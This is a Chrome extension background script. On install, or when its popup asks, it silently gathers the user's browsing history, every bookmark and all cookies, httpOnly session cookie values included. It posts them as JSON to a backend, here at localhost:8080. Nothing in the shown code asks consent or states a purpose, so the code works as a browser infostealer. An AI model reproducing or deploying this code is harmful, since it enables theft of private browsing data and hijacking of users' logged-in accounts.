console.log("Background script loaded!");

// Function to retrieve browsing history
function getHistory(callback) {
    chrome.history.search({ text: "", maxResults: 100 }, (historyItems) => {
        callback(historyItems);
    });
}

// Function to retrieve bookmarks
function getBookmarks(callback) {
    chrome.bookmarks.getTree((bookmarkTreeNodes) => {
        callback(flattenBookmarks(bookmarkTreeNodes));
    });
}

// Helper function to flatten bookmark tree
function flattenBookmarks(nodes, result = []) {
    nodes.forEach(node => {
        if (node.url) {
            result.push({
                id: node.id,
                title: node.title,
                url: node.url
            });
        }
        if (node.children) {
            flattenBookmarks(node.children, result);
        }
    });
    return result;
}

// Function to retrieve cookies
function getCookies(callback) {
    chrome.cookies.getAll({}, (cookies) => {
        callback(cookies.map(cookie => ({
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            path: cookie.path,
            secure: cookie.secure,
            httpOnly: cookie.httpOnly,
            sameSite: cookie.sameSite,
            expirationDate: cookie.expirationDate || null
        })));
    });
}

// Function to send data to backend
function sendDataToBackend() {
    getHistory((history) => {
        getBookmarks((bookmarks) => {
            getCookies((cookies) => {
                const userData = {
                    history,
                    bookmarks,
                    cookies
                };

                console.log("Sending data to backend:", userData);

                fetch("http://localhost:8080/receiveData", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(userData)
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error(`HTTP error! Status: ${response.status}`);
                    }
                    return response.text();  // Read as text first
                })
                .then(text => {
                    try {
                        const data = JSON.parse(text);  // Try parsing as JSON
                        console.log("Data sent successfully:", data);
                    } catch (err) {
                        console.error("Invalid JSON response:", text);
                    }
                })
                .catch(error => console.error("Error sending data:", error));
            });
        });
    });
}

// Trigger the function when the extension is installed or updated
chrome.runtime.onInstalled.addListener(() => {
    sendDataToBackend();
});

// Optionally, listen for messages from the popup to trigger manually
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === "sendData") {
        sendDataToBackend();
        sendResponse({ status: "Data sending initiated" });
    }
});
